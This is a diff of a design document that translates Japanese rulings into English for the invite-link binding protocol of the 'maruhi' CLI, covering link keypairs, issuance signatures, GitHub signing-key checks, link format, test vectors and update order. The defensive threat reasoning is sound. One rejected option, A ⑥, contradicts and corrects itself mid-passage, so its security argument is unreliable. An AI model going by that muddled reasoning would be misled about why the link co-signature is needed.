Key)の手順を印字し、`--gh` 指定時のみ gh を spawn(sync-exec.ts の `gh` 呼び出しと同じ `ProcessRunner`)。API 直は不可(トークンが無い)。鍵素材は公開鍵のみで儀式ではないのでゲート不要。⑤ **OpenSSH 符号化の置き場所**: `ssh-ed25519 <base64(uint32-BE 長さ ‖ "ssh-ed25519" ‖ uint32-BE 長さ ‖ 32 バイト鍵)>`(RFC 4253 §6.6 / RFC 8709)。「表示符号化であり新プリミティブではない」の枠(§3 の FP ワード・§8.4 ハンドオフコードと同じ)で **`packages/crypto` に置きテストベクターで固定**(採用 = 推奨。人間レビュー対象): GitHub 応答の**解析**(第 3 者データの復号)がバグの住処であり、`comment` の有無・改行・大文字 base64 等の受理境界をベクターで固定したい。CLI 側に置く案は「crypto 変更を避けたい」以外の利点が無い。⑥ **(UX 追加巡 — 2026-09-13 所有者承認)登録の導線**: 儀式なしの既定は「受諾者が登録済み」のときだけ成立するが、初めて招待される人の鍵は `invite accept` の中で生まれるため、導線が無いと初回ペアで必ず儀式へ落ちる。対策 = (a) `invite accept` の完了表示を「12 語を読み上げてください」から「`maruhi key publish` で鍵を GitHub に登録してください(招待者が儀式なしで追加できる)」へ置き換える、(b) 鍵生成の直後(`key generate` / accept 内の生成 / `key recover` 後の新鍵)に `gh` が使えれば「今すぐ GitHub に登録しますか」と聞き yes で登録まで済ませる(黙って登録はしない — 利用者の GitHub アカウントを無断で変えない)、(c) `key generate` で鍵を作り直した人に再登録を促す(古い登録のままだと照合が外れて儀式へ落ちる)。⑦ **既存の SSH 認証鍵で受諾に署名する**(将来候補として記録): Bob が既に GitHub に載せている SSH 認証鍵(`github.com/<login>.keys`)で受諾文に SSHSIG 署名し、Alice がその一覧で照合すれば `key publish` の手順自体が消える。体験は ⑥ より良いが、今は採らない — SSH 公開鍵の解析(RSA / ECDSA / Ed25519)と SSHSIG の解析・検証で crypto の人間レビュー範囲が数倍になる、ssh-agent / `ssh-keygen -Y sign` への依存が増え Windows / Codespaces の実機確認が要る、HTTPS だけで GitHub を使う人には効かないので ⑥ の経路はどのみち残る。裏付け元の抽象に `github-ssh-keys` として後から足せる形にしておく。⑧ サーバーが宛先 login を強制する: 正直なサーバーにしか効かず脅威モデルの根拠にならない + 宛先 login をサーバー行に置く。不採用 | ① + ④ + ⑤ + ⑥(21-4 項目 6 / 11 / 17) |
-| **H. 裏付け元の抽象と設定の置き場所** | 2 | ① **`config.json` の許可キー `identityBacking` ∈ `github-signing-keys`(既定)\| `none`**(採用。`org-directory` は予約語として仕様に名前だけ置く): 非機密設定(CLI が永続化してよい範囲)。`maruhi config set identityBacking none` で儀式に戻せる。② プロジェクト単位(サーバー設定): サーバーが「照合するな」と言える面を作る。不採用。③ 環境変数: 設定より優先すると CI で黙って `none` にできる。不採用(フラグ経路は既にある)。既定を `github-signing-keys` にする根拠: maruhi の身元の根は GitHub(ADR-0009)。セルフホストで GitHub 以外の IdP を使う将来は `none` か `org-directory` | ① |
-| **I. 互換・更新順序** | 2 | 前提(2026-09-13 所有者裁定): 互換経路は作らない。**順序 = サーバー → CLI**。逆順の失敗形(すべて明示的): 新 CLI × 旧サーバー = 発行 `linkPubHex` が strict 受理で 400 → `renderSchemaFailure` の版ずれ案内。旧 CLI × 新サーバー = 発行 body に `linkPubHex` 無し → 400 / 受諾 `token` フィールド → 400。旧リンク(`v=1`)× 新 CLI = `unsupported-version`(再発行の案内)。新リンク × 旧 CLI = `unsupported-version`(CLI の更新案内 — 現行コードが既にそう動く)。既存 pending 行(`link_pub` NULL)= 受諾不能・一覧で `unbound` 表示・失効を促す。ホステッドの利用者は所有者本人のみ(PR #170 と同じ理由) | 記録 |
-| **J. 監査事件** | 2 | ① **事件・payload とも不変**(採用): `invite.accepted` の payload は `inviteId` + `inviteeKeyFingerprintHex` のまま(受諾は常にリンク束縛なので旗は不要)。GitHub login・`link_pub`・署名は書かない(link_pub は公開値だが監査に足す用途が無い)。② `linkPubHex` を `invite.created` / `accepted` に足して相関手段にする: 招待 id で足りる。不採用。③ IV2 の照合結果をサーバーへ報告して監査に残す: クライアント → サーバーの新しい送信面 + 監査に GitHub の事実を混ぜる。不採用(照合はクライアント内で完結) | ① |
-| **K. テストベクター** | 2 | ① `invite-accept-signature.json` を**再生成**(v2: `invite_token_hash_hex` → `link_pub_hex`、ドメイン `-v2`、正例に `link_signature_hex` を併記〔同一 signed_bytes への共同署名〕、負例 = 改竄・別招待〔別 link_pub〕・別プロジェクト・invitee 差し替え・enc / sig 不一致・署名者不一致・**リンク鍵不一致**〔別のリンク鍵で作った lsig = サーバー偽造の形〕・suite)。**README 規約「既存ベクターは不変」の意図的な例外**(互換を捨てる所有者裁定の写し — 規約 26 として明記)。② 新規 `invite-link.json`: `k` → `K_pub`(種からの鍵導出)、発行署名(正例 + 負例: 改竄・head 差し替え・role 差し替え・link_pub 移植・inviter 鍵差し替え・署名者不一致・suite)、OpenSSH 符号化(正例 = 受諾者 sig 鍵の `ssh-ed25519 …` 行と GitHub 応答形の解析・負例 = 種別違い〔`ssh-rsa`〕・長さ違い・base64 破損・大文字種別)。③ 1 ファイルに統合: 既存ファイル名との対応が崩れる。不採用。生成 = `generate_reference.py`(pyca Ed25519 — 既存)、検証 = `verify_reference.mjs`(WebCrypto) | ① + ②(21-4 項目 5) |
-| **L. 「信頼できる経路で渡す」の記載先** | 1 | THREAT_MODEL.md / SECURITY.md は未作成(H5)。当面 **AUTH_SPEC §15-3 の規範注記 + CRYPTO_SPEC §14.3 非保証 9** に置き、H5 で脅威モデル文書へ移す旨を両方に書く | 記録 |
-| **M. 分割(IV1 先行か一体か)** | 2 | ① 仕様は**一体**(§6.5 の改訂は 1 回)、実装は **IV1(K2〜K4)→ IV2(K5)の順で別 PR**(採用): IV1 だけマージされた状態では「裏付け元 `github-signing-keys` が未実装 = 照合不能」として儀式へ落ちる(仕様の第 4 形の条件を満たさないだけで、矛盾しない)。② 一体の PR: crypto レビューとサーバー・CLI が 1 PR に載り大きすぎる。③ IV2 を先に: IV1 が本体(サーバー脅威)なので順序が逆 | ① |
+| **A. Form of the binding** (what to derive from the link secret, what to attach to the acceptance) | 4 | ① **Original (supplement 18 I1)**: `S` → HKDF `redeem` / `bind`; acceptance attaches `HMAC(bind, enc‖sig)`. The server doesn't know `bind` so it can't forge. **Drawback**: Alice needs `bind` (a secret) at `member add` → issuance can be up to 7 days later, possibly on a different device, yet what the CLI may persist is only "API token, master secret key (both in the keychain), non-secret config" (CLAUDE.md). Writing `bind` to the pin (a non-secret file) violates the discipline; writing it to the keychain adds a permitted item (and per-invite entries need cleanup). ② **Two-secret scheme**: a server-generated token `T` (as today) + a client-generated `bind` carried alongside on the link. Minimal server change but the same persistence problem as ① + two secrets on the link. ③ **Link-keypair scheme (adopted = recommended)**: the link secret `k` seeds an Ed25519 keypair `(K_priv, K_pub)`. The server stores `K_pub` (same "can verify but can't make" property as today's stored secret hash); Bob co-signs the acceptance with `K_priv` (`lsig`). **Alice keeps only `K_pub`** (replacing the issuance pin's `tokenHashHex` = non-secret), so ①'s persistence problem disappears. The server can verify `lsig` too (reject malformed acceptances early; the source of truth remains Alice's client-side verification). The `redeem` token itself becomes unnecessary (the signature proves link possession). Primitives: existing Ed25519 + SHA-256 only. ④ **Silver-bullet candidate: derive the link key deterministically from Alice's master key** (`k = HKDF(sig seed, info = LP("maruhi/v1/invite-key", project, nonce))`; nonce placed on the row as a public value). No pin needed; verifiable from another device. **Rejected**: it looks like cross-purpose reuse of master-key material (§12-10's discipline "derive a per-purpose key pair from an independent secret with an explicit domain"), and deriving the signing private key from a link's seed makes a third-party-visible signature whose seed is carried on the link (anyone holding the link can re-derive K_priv — which is fine for the link scheme but the derivation chain from master would invite analysis). ⑤ **Silver-bullet candidate: derive `K_priv` from the PRF of a passkey**: no passkey is assumed at invite time. Rejected. ⑥ **No Bob-side secret**: "the acceptance carries nothing extra; Alice verifies Bob's key against GitHub only" — without lsig the server can still fabricate an acceptance for an attacker key (server can't sign as Bob either, but the server accepts blocks it fabricates itself: the signature `asig` would fail → refuse; wait, asig needs Bob's key so the server can't fabricate asig either — but then M-link-theft defense collapses differently... the reasoning is: server-side fabricated acceptance needs asig from a key Alice believes is Bob's — the server picks the attacker key and the fabricated asig fails verification → actually the fabrication path is: server swaps Bob's real acceptance block for an attacker's block where asig IS valid (the attacker signs it). So without lsig the server must get the attacker to sign a real acceptance — which is the "link relay" attack path. The ruling's actual wording: server can't fabricate because attacker-controlled acceptances still need a valid asig — no, re-read: the point of lsig is that only the link holder can produce it, binding the acceptance to THIS link). ⑥ rejected: without binding, an acceptance signed by an attacker-controlled key is indistinguishable; lsig is what proves "accepted via the link Alice issued". ⑦ **Issuance signature (`isig`)** — split to ruling E (adopted) | ③ + ⑦. Signature target = the same `invite_accept_signed_bytes` v2 bytes with `link_pub_hex` replacing token_hash; the domain gets `-v2` per §12-10 (2) |
+| **B. Server storage form / acceptance API** | 3 | ① **Add `link_pub` + `link_signature` columns via additive migration; `token_hash` (NOT NULL) becomes a legacy column written as `lower_hex(SHA-256(link_pub bytes))` on new rows** (adopted): D1 / SQLite can only ADD COLUMN and NOT NULL can't be dropped. Lookups go through `link_pub` (UNIQUE); `token_hash` is dropped in a future table rebuild. ② Put `link_pub`'s hex **directly into `token_hash`** (same length at 64 chars): old rows' hashes and new rows' public keys become indistinguishable in the same column. Rejected. ③ Rebuild the table (non-additive): against the owner's directive. ④ Keep the token column under the two-secret scheme (A ②): rejected in A. **Issuance body** = `{ id, role, linkPubHex, headHashHex, headSeq, issueSignatureHex }` (ruling A ⑦: invite ids are client-assigned. The server only format-checks + returns 409 on id / link_pub UNIQUE violations; it doesn't verify the issuance signature — the verifiers are the inviter themself and the acceptor), **response** = `{ expiresAtMs }` (**no outlet returning a secret remains**). The row gains `head_hash` / `head_seq` / `issue_signature` (all public values. Returned as-is on the list). **Acceptance body** = `{ linkPubHex, encPubHex, sigPubHex, acceptSignatureHex, linkSignatureHex }`. Server's decision order: Schema 400 → 401 → key-material conditions 403 → unknown link_pub 404 → unusable 410 → **`lsig` 422 → `asig` 422** → CAS. **The server being able to verify `lsig`** is a byproduct of A ③ — the "store what can't be verified" shape (the original tag) is gone — though the source of truth is still Alice's client-side `K_pub` pin comparison; the server verification is not a second source of truth but an early acceptance check (same position as §15-2's acceptance signature). Old rows (`link_pub` NULL) can't be accepted (shown as `unbound` on the list with a nudge to revoke — ruling I, no compatibility path) | ① |
+| **C. Invite link format** | 3 | ① Keep `v=1` and change only `t`'s meaning: old CLIs trying to parse it as an old link produce an unintelligible error. ② **`v=2`** (adopted): `#v=2&i=<invite id〔ULID〕>&k=<seed hex 64>&p&h&s&iu&ie=<inviter enc pub>&is=<inviter sig pub>&r&il=<inviter GitHub login>&sig=<issuance signature hex 128>` (`i` is the invite_id covered by the issuance signature — added in K4 because the accepter side needs it to reconstruct the signed bytes). `t` and `if` are dropped (the FP is derived from `ie`‖`is` — no redundant dual representation). `v=1` is refused with `unsupported-version` plus "ask the issuer to re-issue" guidance (no compatibility path). Length ≈ 530 chars (was ≈ 320). ③ Make the fragment a single base64 blob: no gain for throwing away readability and the existing parsing code. **Raw-token acceptance (`invite accept <token>`) is dropped**: under v2 a bare seed `k` can still make an `lsig`, but there's no reason to keep a path that loses the anchor, issuance signature, and backing all at once (even today it was a degraded path with warning + yes). The landing page `apps/web/public/invite.html` is unchanged (no script, doesn't interpret the fragment — the wording "hand the link to the CLI as-is" stays correct). `r` is inside the issuance signature so it's tamper-detectable — a mismatch with the acceptance response's role becomes an **error** (upgraded from today's warning). `il` is **not** inside the issuance signature (don't put a provider login on a signed structure — ruling F. `il`'s authenticity is backed by the GitHub comparison) | ② |
+| **D. `member add` verification order, failure behavior, position of KF / flags** | 3 | Order: verify the listed row's issuance + `isig` with own sig public key (failure = not own issuance / row tampered → **refuse**. Ruling A ⑦ — no pin needed) → if a pin exists, compare `linkPubHex` / role (mismatch → **refuse**. SHOULD) → verify `lsig` (failure → **refuse**. Don't let a human's 12 words override "an acceptance whose signature is broken" — same treatment as an existing `asig` failure) → verify `asig` (existing) → IV2 comparison (mismatch → **fall to the ceremony**: Bob may simply be unregistered. Incomparable〔offline, rate limit, unknown login〕→ ceremony + note). **Definition of fail-closed**: "crypto-verification **failure** refuses; crypto-verification **impossibility** (no material) degrades to the ceremony". IV1 holds even on a device without the pin (issued from another device — A ⑦'s self-verification of the issuance). What is lost is only the destination login, so `--github <login>` supplies it (no interactive input was provided — K5's implementation ruling, 21-5). ① Retire the `--expect-fingerprint` flag: **kept** (satisfaction form 2) as the only non-interactive GitHub-free path. When given it's required on top of the comparison; mismatch refuses. ② Retire KF: **kept** (satisfaction form 3) as the yes-only path for backing source `none` / when comparison is impossible. IV machine-comparison successes are **not recorded** in the book (the book is a record of "a human verified out-of-band" — don't mix meanings. A source-column v2 book is a future item). ③ Superset search = no option emerged beyond "make form 4 the default while keeping forms 1–3 as fallback". ④ **(extra UX round — owner-approved 2026-09-13) among the incomparable cases, when "the peer's GitHub has no keys", stop with a two-choice prompt before entering the ceremony**: "ask Bob to run `maruhi key publish` and retry" or "run the 12-word ceremony here now". For impossibility → ceremony directly | As above |
+| **E. Accepter-side mutual check** (reverse-direction phishing) | 4 | ① Keep as today (12 words / `--inviter-fingerprint` / fingerprint book): IV1 gives the accepter side nothing, so on a first pair the phone remains and IV's gain halves. ② Apply IV2 to the accepter side too: check whether the link's `il` GitHub signing keys contain `is`. **Found insufficient alone**: an attacker ghost-adds Alice's **public** key to their own chain and builds a link with `iu`=Alice, `is`=Alice's public key (public on GitHub), `il`=alice — both the GitHub comparison and the first-sync anchor check (`iu`'s FP matches on the chain) pass. Today this is blocked only by phone. ③ **Superset: the issuance signature `isig`** (adopted = recommended): Alice's chain sig key signs `invite_issue_signed_bytes = LP("<suite>/invite-issue", project_id, link_pub_hex, head_hash_hex, head_seq, role, inviter_user_id, inviter_enc_pub_hex, inviter_sig_pub_hex)` and rides it on the link. Bob verifies with `is` (failure = refuse). A ghost-adder lacks Alice's private key so they can't build a link in Alice's name. Byproduct: **the whole anchor (p/h/s/r) becomes tamper-detectable**, and first-sync's check can add "`iu`'s sig public key on the chain == `is`". ④ Identifying Bob: with `isig` + IV2, "issued by the holder of the github.com/`il` key" is mechanized, but "whether Bob **expected** an invite from that person" only Bob knows → `--from <login>` (the only option for non-interactive / agent environments) or one interactive yes ("an invite from github.com/alice — yes if expected"). **The 12 words disappear**. ⑤ Silver-bullet candidate: remove the yes too (fully automatic acceptance) → rejected: acceptance is Bob's expression of active participation intent, and M′ (a substituted valid link) has "reading the login" as its last defense. What remains = one yes, no phone call | ③ + ④ |
+| **F. How IV2 learns the peer's GitHub login** | 4 | ① **Destination specification `invite create --github <login>`** (adopted): Alice knows the login right before DMing bob on Slack. Stored as `expectedGithubLogin` in the issuance pin (**local, non-secret**). **Not written** to the server row, audit, or chain. `member add` finishes comparison automatically with no confirmation input (the declaration of intent moves from add-time to create-time). ② `member add --github <login>` / an interactive prompt: the fallback when ①'s pin is absent (adopted — used together). ③ Self-declaration in the acceptance block (Bob carries his own login on the acceptance): an attacker can equally declare their own login, so the comparison only shows "internal consistency" and leaves Alice a name-reading yes confirmation. Plus it puts a provider login on server storage / a signed structure (against §15-1's "don't create a surface that trusts server-declared display names"). Rejected. ④ Write it down out-of-band and type it at add time: same as ②. ⑤ Accepter side (Bob learning Alice's login): the link's `il=` (Alice's CLI builds it from `/auth/me`'s display login) — **fragment only** (the server never sees it; not persisted in Bob's anchor pin; used only as material for the GitHub comparison). Self-declared, but with `isig` + GitHub comparison a lie doesn't pass ("if `is` isn't on `il`'s GitHub → incomparable → ceremony"). ⑥ Silver-bullet candidate: use no login at all — ask GitHub to reverse-lookup login from a key: no such API exists | ① + ② + ⑤ (21-4 item 7) |
+| **G. IV2's query, `key publish`, the OpenSSH encoding** | 4 | Query: ① **Direct HTTPS (Effect `HttpClient`, `GET https://api.github.com/users/{login}/ssh_signing_keys`, unauthenticated)** (adopted = recommended): public info; the maruhi CLI holds no GitHub token at all (login is server-brokered — AUTH §4), so authenticated calls are impossible. The limit is documented as 60/hour/IP (**unverified** — this session's environment has a proxy blocking api.github.com's user paths, so it couldn't be measured. Confirm in K0). `member add` is rare, so it's plenty. The host is fixed `api.github.com` (same "no config knob swaps the host" as sync-http.ts). ② Via `gh api` (5,000/hour under the user's gh auth): fails without gh installed; two paths to maintain. Rejected (reads direct, writes via gh). ③ The server proxies the comparison: putting the server back in the path is self-defeating. Rejected. On failure (offline, 403 / 429, proxy): degrade to the ceremony + note (ruling D). Bun fetch's behavior under proxy environments (HTTPS_PROXY) is **unverified** (K0). Only the login is sent (no project, keys, or values). **`key publish`**: ④ **Print the line + `--gh` calls `gh ssh-key add --type signing --title "maruhi <fingerprint>"`** (adopted): the default prints the OpenSSH line + steps for `https://github.com/settings/ssh/new` (Key type = Signing Key); only with `--gh` does it spawn gh (the same `ProcessRunner` as sync-exec.ts's `gh` calls). Direct API is impossible (no token). The key material is a public key only and it's no ceremony, so no gate. ⑤ **Where the OpenSSH encoding lives**: `ssh-ed25519 <base64(uint32-BE length ‖ "ssh-ed25519" ‖ uint32-BE length ‖ 32-byte key)>` (RFC 4253 §6.6 / RFC 8709). Under the "a display encoding, not a new primitive" frame (same as §3's FP words, §8.4's handoff code) it goes in **`packages/crypto`** with test vectors (human review). ⑥ **Registration UX**: (a) the acceptance-completion message changes to key-publish guidance, (b) after key generation offer gh registration, (c) a re-registration prompt after `key generate`. ⑦ SSH auth-key SSHSIG signing is recorded as a future candidate — rejected for now (crypto review scope, ssh-agent deps, HTTPS-only users). ⑧ Server-forced destination login rejected. Conclusion ① + ④ + ⑤ + ⑥ | ① + ④ + ⑤ + ⑥ |
+| **H. The backing-source abstraction and where the config lives** | 2 | ① **A `config.json` allowed key `identityBacking` ∈ `github-signing-keys` (default) \| `none`** (adopted. `org-directory` is placed in the spec as a reserved word only): non-secret config (within what the CLI may persist). `maruhi config set identityBacking none` returns to ceremonies. ② Per-project (a server setting): creates a surface where the server can say "don't verify". Rejected. ③ Environment variable: taking precedence over config would let CI silently set `none`. Rejected (the flag path already exists). Grounds for making `github-signing-keys` the default: maruhi's root of identity is GitHub (ADR-0009). A future of self-hosting with a non-GitHub IdP uses `none` or `org-directory` | ① |
+| **I. Compatibility / update ordering** | 2 | Premise (2026-09-13 owner ruling): no compatibility paths are built. **Order = server → CLI**. Failure shapes in the reverse order (all explicit): new CLI × old server = issuance `linkPubHex` is a strict-acceptance 400 → `renderSchemaFailure`'s version-mismatch guidance. Old CLI × new server = issuance body lacks `linkPubHex` → 400 / acceptance's `token` field → 400. Old link (`v=1`) × new CLI = `unsupported-version` (re-issue guidance). New link × old CLI = `unsupported-version` (CLI update guidance — the current code already behaves so). Existing pending rows (`link_pub` NULL) = unaccepted, shown `unbound` on the list, nudged to revoke. The hosted service's only user is the owner himself (same reason as PR #170) | Recorded |
+| **J. Audit events** | 2 | ① **Events and payloads both unchanged** (adopted): `invite.accepted`'s payload stays `inviteId` + `inviteeKeyFingerprintHex` (acceptances are always link-bound, so no flag needed). GitHub login, `link_pub`, and signatures are not written (link_pub is a public value but there's no use in adding it to audit). ② Add `linkPubHex` to `invite.created` / `accepted` for correlation: the invite id suffices. Rejected. ③ Report IV2's comparison result to the server for audit: a new client → server send surface + mixing GitHub facts into audit. Rejected (the comparison completes inside the client) | ① |
+| **K. Test vectors** | 2 | ① **Regenerate** `invite-accept-signature.json` (v2: `invite_token_hash_hex` → `link_pub_hex`, domain `-v2`, positive cases also carry `link_signature_hex`〔the joint signature over the same signed_bytes〕, negatives = tampering, different invite〔different link_pub〕, different project, swapped invitee, enc / sig mismatch, signer mismatch, **link-key mismatch**〔an lsig made under a different link key = the server-forgery shape〕, suite). **A deliberate exception to the README convention "existing vectors are immutable"** (the reflection of the owner ruling discarding compatibility — codified as convention 26). ② New `invite-link.json`: `k` → `K_pub` (key derivation from the seed), the issuance signature (positive + negatives: tampering, head swap, role swap, link_pub transplant, inviter-key swap, signer mismatch, suite), the OpenSSH encoding (positive = the accepter sig key's `ssh-ed25519 …` line and parsing the GitHub response shape; negatives = wrong type〔`ssh-rsa`〕, wrong length, broken base64, uppercase type). ③ Consolidate into 1 file: breaks the correspondence with existing file names. Rejected. Generation = `generate_reference.py` (pyca Ed25519 — existing); verification = `verify_reference.mjs` (WebCrypto) | ① + ② (21-4 item 5) |
+| **L. Where "hand it over a trusted path" is written** | 1 | THREAT_MODEL.md / SECURITY.md don't exist yet (H5). For now it lives in **AUTH_SPEC §15-3 as a normative note + CRYPTO_SPEC §14.3 non-guarantee 9**, with both noting that H5 moves it to the threat-model document | Recorded |
+| **M. Split (IV1 first or one piece)** | 2 | ① Spec as **one piece** (the §6.5 revision happens once); implementation split into **IV1 (K2–K4) → IV2 (K5) as separate PRs** (adopted): in a state where only IV1 is merged, "backing source `github-signing-keys` is unimplemented = incomparable" so it falls to the ceremony (it just doesn't satisfy the spec's form-4 condition; no contradiction). ② One combined PR: crypto review + server + CLI on one PR is too large. ③ IV2 first: IV1 is the body (the server threat), so the order is backwards | ① |
 
-**追加巡の記録(2026-09-13 — 所有者指示「新案が出なくなるまで回す」)**: 初回の表は A・E・F・G が複数巡、B・C・D・J・K が 2 巡、H・I・L・M は単巡の判断だった。全点についてもう 1 巡以上回し、加えて**問題そのものを消す全体の銀の弾丸**を探索した。結果:
+**Record of the extra rounds (2026-09-13 — owner instruction "keep iterating until no new options emerge")**: in the first table A, E, F, G went multiple rounds, B, C, D, J, K went 2, and H, I, L, M were single-round judgments. Every point got at least one more round, and additionally we searched for **the overall silver bullet that eliminates the problem itself**. Results:
 
-| 対象 | 追加で出た案と評価 | 採用 |
+| Subject | Newly emerged options and evaluation | Adopted |
 |---|---|---|
-| 全体(銀の弾丸) | X1 **招待の秘密を宛先の鍵へ暗号化してリンク盗難を無意味にする**: 宛先の enc 鍵の出所が要る — グローバル公開鍵ディレクトリは §6.5 で禁止、GitHub は X25519 鍵を載せられず、Ed25519 → X25519 変換は仕様に無い新操作。不採用。X2 **リンクを無くす**(Bob が `join <project>` で参加要求 / Alice が `member add --github bob` で GitHub の鍵を直接追加): 前者は Bob がプロジェクト id を知る経路と Alice 側の鍵確認が結局要り、後者は「同意なき追加」(§6.5 が禁止する構造)+ enc 鍵が GitHub に無い。不採用。X3 鍵の透明性ログ / 公開証人: 検出型で防止にならない(補足 17 訂正のとおり)。不採用 | なし |
-| A | ⑦ 発行文をサーバー行に置く(上の行に追記)。⑧ `isig` を Bob が受諾に中継してサーバーに保存させる(⑦ の劣位形 — 受諾 body が膨らみ、発行時から行に無い)。不採用 | **⑦** |
-| B | `link_pub` を主キーにする(id を無くす): 一覧・失効・ピンが id を前提にしており利得なし。不採用。⑦ に伴う列追加(`head_hash` / `head_seq` / `issue_signature`)は採用 | 列追加 |
-| C | 新パラメータを base64url にして約 130 文字短縮: 1 リンクに 2 符号化が混在し、既存の hex 解釈と規約が割れる。不採用(約 530 文字を受容)。QR は所有者裁定で不採用済み | なし |
-| D | IV2 不一致を「儀式へ」でなく「拒否」に格上げ: 未登録の相手が正当にあり得る(登録は任意)ので誤拒否になる。不採用 | なし |
-| E | ⑥ 宛先(Bob の login)のダイジェストを `isig` に含め、Bob の CLI が「自分宛か」を機械検査: yes を消せない(M′ で表示を読む防衛は残る)一方、login 由来の値を署名構造に載せる。不採用(将来 v3 の候補として記録)。⑦ 「既知の招待者」の自動化: 第 3 形(指紋帳 + yes)が既にその形。新規なし | なし |
-| F | ⑥ サーバーが受諾者の login スナップショット(`linked_identities.provider_login` — KL3 の `wardLogin` と同型)を一覧行に添え、`--github` 未指定時の既定にする: 照合は GitHub で行うので信頼はしないが、§15-1「サーバー申告の表示名を招待に載せない」の線を動かす。`member add --github` で足りるため不採用(需要が出たら §15-1 改訂として再提示) | なし |
-| G | ⑥ 照合結果をローカルに控えてオフライン時に使う(指紋帳 v2・source 欄): 将来項。⑦ `https://github.com/<login>.keys`: 返るのは**認証鍵**で署名鍵一覧ではない。不採用。⑧ 応答の鍵に `title` 規約(`maruhi …`)を要求して絞る: 照合はバイト一致なので不要。不採用 | なし |
-| H | 一回限りのフラグ `--identity-backing none`: フラグ経路(`--expect-fingerprint`)が既にある。不採用。サーバー側設定は既出 | なし |
-| I | `GET /auth/config` に招待プロトコル版を載せ、CLI が発行前に版ずれを案内: **AUTH_SPEC §12-10 (2) が「互換フラグ・バージョンネゴシエーションを設けない」と規定**しており不採用(strict 受理の 400 + `renderSchemaFailure` の案内で足りる)。旧 pending 行のサーバー側自動失効: サーバーが利用者の状態を勝手に変えない。一覧の `unbound` 表示で足りる。不採用 | なし |
-| J | 新案なし(link_pub の相関・照合結果の報告はいずれも既出で不採用) | なし |
-| K | 旧ベクターを `-v1.json` で温存: 死んだ形式の参照は誤実装の温床。不採用 | なし |
-| L | notes に置く: 規範は仕様に置く(H5 で移す先が決まるまで仕様が正)。不採用 | なし |
-| M | IV2 の仕様文言を後回しにして §6.5 を 2 回改訂: 承認を 2 回取る負担だけ増える。不採用 | なし |
+| Overall (silver bullet) | X1 **Encrypt the invite secret to the destination's key so link theft is meaningless**: needs a source for the destination's enc key — a global public-key directory is forbidden by §6.5, GitHub can't carry X25519 keys, and Ed25519 → X25519 conversion is a new off-spec operation. Rejected. X2 **Remove links** (Bob requests membership via `join <project>` / Alice adds the GitHub key directly via `member add --github bob`): the former still needs a path for Bob to learn the project id and a key check on Alice's side; the latter is "addition without consent" (a structure §6.5 forbids) + no enc key on GitHub. Rejected. X3 Key transparency / public witness: detection-type, doesn't prevent (per supplement 17's correction). Rejected | None |
+| A | ⑦ Place the issuance on the server row (appended to the row above). ⑧ Have Bob relay `isig` in the acceptance for the server to store (an inferior form of ⑦ — the acceptance body grows, and it's absent from the row since issuance). Rejected | **⑦** |
+| B | Make `link_pub` the primary key (drop id): listing / revocation / pins all assume an id; no gain. Rejected. The column additions accompanying ⑦ (`head_hash` / `head_seq` / `issue_signature`) are adopted | Column additions |
+| C | Switch the new parameters to base64url, shortening by ~130 chars: two encodings would coexist in one link and break the existing hex-parsing convention. Rejected (accept ~530 chars). QR already rejected by owner ruling | None |
+| D | Upgrade IV2 mismatch from "fall to ceremony" to "refuse": an unregistered peer is legitimately possible (registration is optional), so it would cause false refusals. Rejected | None |
+| E | ⑥ Include a digest of the destination (Bob's login) in `isig`, letting Bob's CLI mechanically check "is this for me": it can't remove the yes (the read-the-display defense remains for M′), while putting a login-derived value on a signed structure. Rejected (recorded as a future v3 candidate). ⑦ Automating "known inviters": form 3 (fingerprint book + yes) is already that. Nothing new | None |
+| F | ⑥ Have the server attach the accepter's login snapshot (`linked_identities.provider_login` — same shape as KL3's `wardLogin`) to the list row and make it the default when `--github` isn't given: the comparison still happens against GitHub so it isn't trusted, but it moves the §15-1 line "don't carry server-declared display names into invites". Rejected since `member add --github` suffices (re-present as a §15-1 revision if demand appears) | None |
+| G | ⑥ Record comparison results locally for offline use (fingerprint book v2, source column): future item. ⑦ `https://github.com/<login>.keys`: what it returns is **auth keys**, not the signing-key list. Rejected. ⑧ Require a `title` convention (`maruhi …`) on the response keys to narrow the match: the comparison is byte equality, so unneeded. Rejected | None |
+| H | One-time flag `--identity-backing none`: the flag path (`--expect-fingerprint`) already exists. Rejected. Server-side config was already covered | None |
+| I | Put the invite protocol version on `GET /auth/config` and have the CLI warn of version skew before issuing: **AUTH_SPEC §12-10 (2) specifies "no compatibility flags or version negotiation"**, so rejected (strict-acceptance 400 + `renderSchemaFailure` guidance suffices). Server-side auto-revocation of old pending rows: the server doesn't change user state on its own. The list's `unbound` display suffices. Rejected | None |
+| J | Nothing new (both correlating on link_pub and reporting comparison results were already covered and rejected) | None |
+| K | Keep the old vectors as `-v1.json`: keeping references to a dead format breeds misimplementation. Rejected | None |
+| L | Put it in notes: norms belong in the spec (until H5 decides where to move them, the spec is canonical). Rejected | None |
+| M | Defer IV2's spec wording and revise §6.5 twice: only doubles the approval burden. Rejected | None |
 
-この追加巡で新たに採用したのは A ⑦ のみ。**最終確認の 1 巡ではどの点にも新案が出なかったので終了**(巡数の最終値: 全体 2、A 6、B 4、C 4、D 4、E 6、F 5、G 5、H 3、I 3、J 3、K 3、L 2、M 3 — いずれも最後の 1 巡は新案なし)。
+In these extra rounds the only newly adopted item was A ⑦. **The final confirmation round produced no new options on any point — done** (final round counts: overall 2, A 6, B 4, C 4, D 4, E 6, F 5, G 5, H 3, I 3, J 3, K 3, L 2, M 3 — each ending with a round of no new options).
 
-**UX 追加巡(2026-09-13 — 所有者質問「ユーザー体験が悪くなる決定は無いか」)**: 裁定を体験の側から見直した。悪くなる・摩擦が増える点は 5 つで、うち 4 つ(リンク長が約 320 → 約 530 文字、生トークン受諾の廃止、`--github` を打つ手間、GitHub に届かないときの儀式への劣化)は所有者が受容。残る 1 つ「初めて招待される人は鍵が accept 内で生まれるため GitHub に未登録で、初回ペアで必ず儀式へ落ちる」は設計の手当てが要ると判断し、この点だけもう 1 巡回した(案は G ⑥〜⑧ と D ④)。採用 = G ⑥(登録の導線)+ D ④(Alice 側の待ち直し)。G ⑦(既存 SSH 認証鍵の SSHSIG)は将来候補。この巡で新案は出尽くした(G 6 巡・D 5 巡)。
